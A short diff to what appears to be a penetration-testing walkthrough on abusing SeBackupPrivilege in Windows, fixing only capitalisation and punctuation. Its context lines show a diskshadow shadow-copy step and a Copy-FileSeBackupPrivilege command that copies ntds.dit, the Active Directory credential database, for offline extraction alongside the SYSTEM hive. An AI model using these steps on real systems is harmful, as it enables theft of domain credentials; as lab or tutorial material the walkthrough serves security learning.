@@ -37,9 +37,9 @@ diskshadow /s c:\\programdata\\vss.dsh
 ```
 
 ### Now you can copy any file 
-copy any file to present dir and then download it to your system
+Copy any file to present dir and then download it to your system.
 
-We gonna get ntds.dit and system
+We gonna get ntds.dit and system.
 ```markdown
 Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
 ```
